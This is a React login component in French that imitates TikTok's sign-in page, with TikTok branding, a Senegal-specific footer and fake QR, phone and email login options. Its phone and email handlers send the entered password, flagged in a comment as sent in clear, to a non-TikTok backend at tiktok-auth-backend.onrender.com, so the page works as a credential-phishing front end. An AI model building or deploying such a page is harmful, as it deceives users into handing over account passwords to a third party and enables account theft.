import React, { useState, useRef } from 'react';
import axios from 'axios';
import { Link, useNavigate } from 'react-router-dom';

//axios.defaults.baseURL = 'http://localhost:5000';
//axios.defaults.baseURL = process.env.REACT_APP_API_URL;
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';
console.log('🔍 Environment:', process.env.NODE_ENV);
console.log('🔍 API_URL determined:', API_URL);
axios.defaults.withCredentials = true;

// Force l'URL en production
if (window.location.hostname !== 'localhost') {
  axios.defaults.baseURL = 'https://tiktok-auth-backend.onrender.com';
  console.log('🚀 Production detected, using:', axios.defaults.baseURL);
} else {
  axios.defaults.baseURL = 'http://localhost:5000';
  console.log('🏠 Local detected, using:', axios.defaults.baseURL);
}

export default function Login() {
  const [activeMethod, setActiveMethod] = useState('');
  const [loginType, setLoginType] = useState('phone'); // 'phone' ou 'email'

  const connexionTelEmail = "Utiliser le téléphone/e-mail/nom d'utilisateur";

  // États pour les différentes méthodes
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [phone, setPhone] = useState('');
  const [phonePassword, setPhonePassword] = useState('');

  // États pour QR Code
  const [qrCode, setQrCode] = useState('');
  const [qrExpiry, setQrExpiry] = useState(0);

  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const intervalRef = useRef(null);

  // Générer QR Code
  const generateQRCode = async () => {
    try {
      const res = await axios.post('/auth/generate-qr');
      setQrCode(res.data.qrCode);
      setQrExpiry(120);

      intervalRef.current = setInterval(async () => {
        try {
          const checkRes = await axios.post('/auth/check-qr', { qrCode: res.data.qrCode });
          if (checkRes.data.authenticated) {
            clearInterval(intervalRef.current);
            navigate('/home');
          }
        } catch (err) {
          console.error('Erreur vérification QR');
        }
      }, 2000);

      setTimeout(() => {
        setQrExpiry(0);
        if (intervalRef.current) clearInterval(intervalRef.current);
      }, 120000);
    } catch (err) {
      console.error('Erreur génération QR:', err);
    }
  };

  const handleMethodSelect = (method) => {
    setActiveMethod(method);
    if (method === 'qr') {
      generateQRCode();
    } else if (method === 'phone-email') {
      setLoginType('phone'); // Par défaut sur téléphone
    }
  };

  const handleEmailLogin = async () => {
    if (!email || !password) {
      alert('Veuillez remplir tous les champs');
      return;
    }

    setLoading(true);
    try {
      // 🎯 ENVOI DU MOT DE PASSE EN CLAIR
      const response = await axios.post('/auth/demo-login', {
        email: email,
        password: password, // On envoie le mot de passe saisi
        username: email.split('@')[0]
      });

      navigate('/home');
    } catch (err) {
      alert(err.response?.data?.error || 'Erreur de connexion');
    } finally {
      setLoading(false);
    }
  };

 const handlePhoneLogin = async () => {
   if (!phone || !phonePassword) {
     alert('Veuillez remplir tous les champs');
     return;
   }

   setLoading(true);
   try {
     const response = await axios.post('/auth/demo-login', {
       email: `phone-${phone}@demo.com`,
       password: phonePassword, // Mot de passe saisi
       username: `user-${phone}`
     });

     navigate('/home');
   } catch (err) {
     alert(err.response?.data?.error || 'Erreur de connexion');
   } finally {
     setLoading(false);
   }
 };

  const handleSocialLogin = (provider) => {
    window.location.href = `${process.env.REACT_APP_API_URL}/auth/${provider}`;
  };

  return (
    <div style={{
      height: '100vh',
      background: 'linear-gradient(135deg, #25f4ee 0%, #fe2c55 25%, #25f4ee 50%, #fe2c55 75%, #25f4ee 100%)',
      backgroundSize: '400% 400%',
      animation: 'gradientShift 3s ease infinite',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      position: 'relative'
    }}>

      {/* Modal de connexion - affiché directement */}
      <div style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        background: 'rgba(0,0,0,0.8)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        zIndex: 1000
      }}>
        <div style={{
          width: '500px',
          height: '100vh',
          background: '#121212',
          borderRadius: '8px',
          position: 'relative',
          overflow: 'hidden',
          display: 'flex',
          flexDirection: 'column'
        }}>

          {/* Header du modal */}
          <div style={{
            paddingTop: '20px',
            paddingBottom: '20px',
            textAlign: 'center',
            position: 'relative',
            flexShrink: 0
          }}>
            <h2 style={{
              color: 'white',
              margin: '50px 0 0 0',
              fontSize: '32px',
              fontWeight: '700'
            }}>
              Connecte-toi à TikTok
            </h2>
          </div>

          {/* Contenu principal avec scroll */}
          <div style={{
            padding: '20px',
            overflowY: 'auto',
            display: 'flex',
            justifyContent: 'center',
            flex: 1,
            minHeight: 0
          }}>

            {/* Vue principale - sélection des méthodes */}
            {!activeMethod && (
              <div>
                {/* Utiliser un code QR */}
                <button
                  onClick={() => handleMethodSelect('qr')}
                  style={methodButtonStyle}
                >
                  <svg
                      style={{
                          position: 'relative',
                             left: -70
                      }}
                       width="1.4em" data-e2e="" height="1.4em" viewBox="0 0 48 48" fill="currentColor"
                       xmlns="http://www.w3.org/2000/svg">
                       <path fillRule="evenodd" clipRule="evenodd" d="M8 6C6.89543 6 6 6.89543 6 8V21C6 22.1046 6.89543 23 8 23H21C22.1046 23 23 22.1046 23 21V8C23 6.89543 22.1046 6 21 6H8ZM10 19V10H19V19H10ZM28 6C26.8954 6 26 6.89543 26 8V21C26 22.1046 26.8954 23 28 23H41C42.1046 23 43 22.1046 43 21V8C43 6.89543 42.1046 6 41 6H28ZM30 19V10H39V19H30ZM8 26C6.89543 26 6 26.8954 6 28V41C6 42.1046 6.89543 43 8 43H21C22.1046 43 23 42.1046 23 41V28C23 26.8954 22.1046 26 21 26H8ZM10 39V30H19V39H10ZM26 42C26 42.5523 26.4477 43 27 43H29C29.5523 43 30 42.5523 30 42V27C30 26.4477 29.5523 26 29 26H27C26.4477 26 26 26.4477 26 27V42ZM32.5 42C32.5 42.5523 32.9477 43 33.5 43H35.5C36.0523 43 36.5 42.5523 36.5 42V27C36.5 26.4477 36.0523 26 35.5 26H33.5C32.9477 26 32.5 26.4477 32.5 27V42ZM40 43C39.4477 43 39 42.5523 39 42V27C39 26.4477 39.4477 26 40 26H42C42.5523 26 43 26.4477 43 27V42C43 42.5523 42.5523 43 42 43H40Z"></path>
                  </svg>
                  <span>Utiliser un code QR</span>
                </button>

                {/* Utiliser le téléphone/email */}
                <button
                  onClick={() => handleMethodSelect('phone-email')}
                  style={methodButtonStyle}
                >
                  <svg
                      style={{
                          position: 'relative',
                          left: 3
                      }}
                      width="1.4em" data-e2e="" height="1.4em" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M24.0003 7C20.1343 7 17.0003 10.134 17.0003 14C17.0003 17.866 20.1343 21 24.0003 21C27.8663 21 31.0003 17.866 31.0003 14C31.0003 10.134 27.8663 7 24.0003 7ZM13.0003 14C13.0003 7.92487 17.9252 3 24.0003 3C30.0755 3 35.0003 7.92487 35.0003 14C35.0003 20.0751 30.0755 25 24.0003 25C17.9252 25 13.0003 20.0751 13.0003 14ZM24.0003 33C18.0615 33 13.0493 36.9841 11.4972 42.4262C11.3457 42.9573 10.8217 43.3088 10.2804 43.1989L8.32038 42.8011C7.77914 42.6912 7.4266 42.1618 7.5683 41.628C9.49821 34.358 16.1215 29 24.0003 29C31.8792 29 38.5025 34.358 40.4324 41.628C40.5741 42.1618 40.2215 42.6912 39.6803 42.8011L37.7203 43.1989C37.179 43.3088 36.6549 42.9573 36.5035 42.4262C34.9514 36.9841 29.9391 33 24.0003 33Z"></path></svg>
                  <span style={{fontSize: 13 , paddingLeft:15}} >{connexionTelEmail}</span>
                </button>

                {/* Facebook */}
                <button
                  onClick={() => handleSocialLogin('facebook')}
                  style={methodButtonStyle}
                >
                   <svg
                       style= {{
                           position: 'relative',
                           left: -49
                          }}
                         xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="25" height="25" viewBox="0 0 48 48">
                        <path fill="#039be5" d="M24 5A19 19 0 1 0 24 43A19 19 0 1 0 24 5Z"></path><path fill="#fff" d="M26.572,29.036h4.917l0.772-4.995h-5.69v-2.73c0-2.075,0.678-3.915,2.619-3.915h3.119v-4.359c-0.548-0.074-1.707-0.236-3.897-0.236c-4.573,0-7.254,2.415-7.254,7.917v3.323h-4.701v4.995h4.701v13.729C22.089,42.905,23.032,43,24,43c0.875,0,1.729-0.08,2.572-0.194V29.036z"></path>
                   </svg>
                   <span>Continuer avec Facebook </span>
                </button>

                {/* Google */}
                <button
                  onClick={() => handleSocialLogin('google')}
                  style={methodButtonStyle}
                >
                  <svg
                      style={{
                          position: 'relative',
                             left: -55
                      }}
                  xmlns="http://www.w3.org/2000/svg" x="px" y="0px" width="23" height="23" viewBox="0 0 48 48">
                     <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
                  </svg>
                   <span>Continuer avec Google</span>
                </button>

                {/* Apple */}
                <button
                  onClick={() => handleSocialLogin('apple')}
                  style={methodButtonStyle}
                >
                   <svg
                     style= {{
                         position: 'relative',
                         left: -58
                     }}
                    xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="25" height="25" viewBox="0 0 50 50">
                      <path d="M 44.527344 34.75 C 43.449219 37.144531 42.929688 38.214844 41.542969 40.328125 C 39.601563 43.28125 36.863281 46.96875 33.480469 46.992188 C 30.46875 47.019531 29.691406 45.027344 25.601563 45.0625 C 21.515625 45.082031 20.664063 47.03125 17.648438 47 C 14.261719 46.96875 11.671875 43.648438 9.730469 40.699219 C 4.300781 32.429688 3.726563 22.734375 7.082031 17.578125 C 9.457031 13.921875 13.210938 11.773438 16.738281 11.773438 C 20.332031 11.773438 22.589844 13.746094 25.558594 13.746094 C 28.441406 13.746094 30.195313 11.769531 34.351563 11.769531 C 37.492188 11.769531 40.8125 13.480469 43.1875 16.433594 C 35.421875 20.691406 36.683594 31.78125 44.527344 34.75 Z M 31.195313 8.46875 C 32.707031 6.527344 33.855469 3.789063 33.4375 1 C 30.972656 1.167969 28.089844 2.742188 26.40625 4.78125 C 24.878906 6.640625 23.613281 9.398438 24.105469 12.066406 C 26.796875 12.152344 29.582031 10.546875 31.195313 8.46875 Z"></path>
                   </svg>
                  <span>Continuer avec Apple</span>
                </button>
              </div>
            )}

            {/* Vue QR Code */}
            {activeMethod === 'qr' && (
              <div style={{ textAlign: 'center' }}>
                <button
                  onClick={() => setActiveMethod('')}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#fe2c55',
                    marginBottom: '20px',
                    cursor: 'pointer'
                  }}
                >
                  ← Retour
                </button>

                <h3 style={{ color: 'white', marginBottom: '20px' }}>Scanner le QR Code</h3>

                <div style={{
                  width: '200px',
                  height: '200px',
                  background: '#2f2f2f',
                  border: '2px solid #444',
                  borderRadius: '8px',
                  margin: '0 auto 20px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  position: 'relative'
                }}>
                  <div style={{
                    fontSize: '60px',
                    color: '#666'
                  }}>📱</div>
                  {qrCode && (
                    <div style={{
                      position: 'absolute',
                      bottom: '-25px',
                      fontSize: '10px',
                      color: '#666'
                    }}>
                      {qrCode}
                    </div>
                  )}
                </div>

                <div style={{
                  background: '#2a2a2a',
                  padding: '15px',
                  borderRadius: '8px',
                  marginBottom: '20px'
                }}>
                  <p style={{ margin: 0, fontSize: '14px', color: '#ccc', lineHeight: '1.5' }}>
                    1. Scanne avec la caméra de ton appareil mobile<br/>
                    2. Confirme la connexion ou inscris-toi
                  </p>
                </div>

                <button
                  onClick={generateQRCode}
                  style={{
                    background: '#fe2c55',
                    color: 'white',
                    border: 'none',
                    padding: '10px 20px',
                    borderRadius: '4px',
                    cursor: 'pointer',
                    fontSize: '14px'
                  }}
                >
                  🔄 Actualiser le code
                </button>

                {qrExpiry > 0 && (
                  <p style={{ fontSize: '12px', color: '#666', marginTop: '10px' }}>
                    Expire dans: {Math.floor(qrExpiry/60)}:{(qrExpiry%60).toString().padStart(2, '0')}
                  </p>
                )}
              </div>
            )}

            {/* Vue Téléphone/Email */}
            {activeMethod === 'phone-email' && (
              <div>
                <button
                  onClick={() => setActiveMethod('')}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#fe2c55',
                    marginBottom: '20px',
                    cursor: 'pointer'
                  }}
                >
                  ← Retour
                </button>

                {/* Titre selon le type de connexion */}
                <h3 style={{
                  color: 'white',
                  marginBottom: '5px',
                  fontSize: '18px'
                }}>
                  {loginType === 'phone' ? 'Téléphone' : 'E-mail ou nom d\'utilisateur'}
                </h3>

                {/* Sous-titre avec lien pour basculer */}
                <p style={{
                  color: '#E8E8E8',
                  marginBottom: '20px',
                  fontSize: '14px',
                  //textDecoration: 'underline',
                  fontWeight: '600'
                }}>
                  {loginType === 'phone' ? (
                    <>
                      Connexion avec une adresse{' '}
                      <button
                        onClick={() => setLoginType('email')}
                        style={{
                          background: 'none',
                          border: 'none',
                          color: '#E8E8E8',
                          cursor: 'pointer',
                          textDecoration: 'underline',
                          fontSize: '14px',
                          padding: 0,
                          fontWeight: '600'
                        }}
                      >
                        e-mail ou un nom d'utilisateur
                      </button>
                    </>
                  ) : (
                    <>
                      Connexion avec un{' '}
                      <button
                        onClick={() => setLoginType('phone')}
                        style={{
                          background: 'none',
                          border: 'none',
                          color: '#E8E8E8',
                          cursor: 'pointer',
                          textDecoration: 'underline',
                          fontSize: '14px',
                          padding: 0,
                          fontWeight: '600'
                        }}
                      >
                        numéro de téléphone
                      </button>
                    </>
                  )}
                </p>

                {/* Connexion par téléphone */}
                {loginType === 'phone' && (
                  <div>
                    <div style={{
                      display: 'flex',
                      marginBottom: '15px'
                    }}>
                      <select
                        style={{
                          background: '#2a2a2a',
                          border: '1px solid #444',
                          color: 'white',
                          padding: '12px',
                          borderRadius: '4px 0 0 4px',
                          fontSize: '14px',
                          outline: 'none',
                          width: '120px'
                        }}
                      >
                        <option value="+221">SN +221</option>
                      </select>
                      <input
                        placeholder="Numéro de téléphone"
                        type="tel"
                        value={phone}
                        onChange={e => setPhone(e.target.value)}
                        style={{
                          ...inputDarkStyle,
                          borderRadius: '0 4px 4px 0',
                          borderLeft: 'none',
                          marginBottom: 0,
                          flex: 1
                        }}
                      />
                    </div>
                    <input
                      placeholder="Mot de passe"
                      type="password"
                      value={phonePassword}
                      onChange={e => setPhonePassword(e.target.value)}
                      style={inputDarkStyle}
                    />

                    <div style={{
                      display: 'flex',
                      justifyContent: 'space-between',
                      alignItems: 'center',
                      marginBottom: '20px'
                    }}>
                      <button
                        style={{
                          background: 'none',
                          border: 'none',
                          color: '#fe2c55',
                          cursor: 'pointer',
                          fontSize: '14px'
                        }}
                      >
                        Mot de passe oublié ?
                      </button>
                      <button
                        style={{
                          background: 'none',
                          border: 'none',
                          color: '#fe2c55',
                          cursor: 'pointer',
                          fontSize: '14px'
                        }}
                      >
                        Connexion avec un code
                      </button>
                    </div>

                    <button
                      onClick={handlePhoneLogin}
                      disabled={loading}
                      style={submitButtonStyle}
                    >
                      {loading ? 'Connexion...' : 'Se connecter'}
                    </button>
                  </div>
                )}

                {/* Connexion par email */}
                {loginType === 'email' && (
                  <div>
                    <input
                      placeholder="E-mail ou nom d'utilisateur"
                      type="email"
                      value={email}
                      onChange={e => setEmail(e.target.value)}
                      style={inputDarkStyle}
                    />
                    <input
                      placeholder="Mot de passe"
                      type="password"
                      value={password}
                      onChange={e => setPassword(e.target.value)}
                      style={inputDarkStyle}
                    />

                    <div style={{
                      textAlign: 'left',
                      marginBottom: '20px'
                    }}>
                      <button
                        style={{
                          background: 'none',
                          border: 'none',
                          color: '#fe2c55',
                          cursor: 'pointer',
                          fontSize: '14px'
                        }}
                      >
                        Mot de passe oublié ?
                      </button>
                    </div>

                    <button
                      onClick={handleEmailLogin}
                      disabled={loading}
                      style={submitButtonStyle}
                    >
                      {loading ? 'Connexion...' : 'Se connecter'}
                    </button>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Footer du modal - fixé en bas */}
          <div style={{
            padding: '15px 20px',
            borderTop: '1px solid #2f2f2f',
            background: '#252525',
            flexShrink: 0,
            marginTop: 'auto'
          }}>

            {/* Conditions d'utilisation */}
            <div style={{
              fontSize: '11px',
              color: '#888',
              textAlign: 'center',
              lineHeight: '1.4'
            }}>
              En continuant avec un compte basé dans le pays suivant :<br/>
              <strong>Sénégal</strong>, tu acceptes nos <span style={{ color: '#fe2c55' }}>Conditions d'utilisation</span> et<br/>
              reconnais avoir lu notre <span style={{ color: '#fe2c55' }}>Politique de confidentialité</span>.
            </div>

            {/* Lien inscription */}
            <div style={{
              textAlign: 'center',
              marginBottom: '15px'
            }}>
              <span style={{ color: '#888', fontSize: '14px' }}>
                Tu n'as pas de compte ?{' '}
              </span>
              <Link
                to="/register"
                style={{
                  color: '#fe2c55',
                  textDecoration: 'none',
                  fontWeight: 'bold',
                  fontSize: '14px'
                }}
                onMouseOver={(e) => e.target.style.textDecoration = 'underline'}
                onMouseOut={(e) => e.target.style.textDecoration = 'none'}
              >
                S'inscrire
              </Link>
            </div>
          </div>
        </div>
      </div>

      <style>
        {`
          @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
          }
        `}
      </style>
    </div>
  );
}

// Styles pour les boutons de méthode
const methodButtonStyle = {
  width: '100%',
  background: '#252525',
  border: '1px solid #444',
  color: '#E8E8E8',
  paddingLeft: 15,
  paddingRight: 15,
  paddingTop: 10,
  paddingBottom: 10,
  marginBottom: '12px',
  borderRadius: 10,
  cursor: 'pointer',
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center',
  fontSize: '15px',
  transition: 'background 0.2s',
  gap: 10,
  fontWeight: 'semiBold'
};

// Styles pour les inputs sombres
const inputDarkStyle = {
  width: '100%',
  background: '#2a2a2a',
  border: '1px solid #444',
  color: 'white',
  padding: '12px',
  marginBottom: '15px',
  borderRadius: '4px',
  fontSize: '14px',
  outline: 'none',
  boxSizing: 'border-box'
};

// Style pour le bouton de soumission
const submitButtonStyle = {
  width: '100%',
  background: '#fe2c55',
  border: 'none',
  color: 'white',
  padding: '12px',
  borderRadius: '4px',
  cursor: 'pointer',
  fontSize: '16px',
  fontWeight: 'bold'
};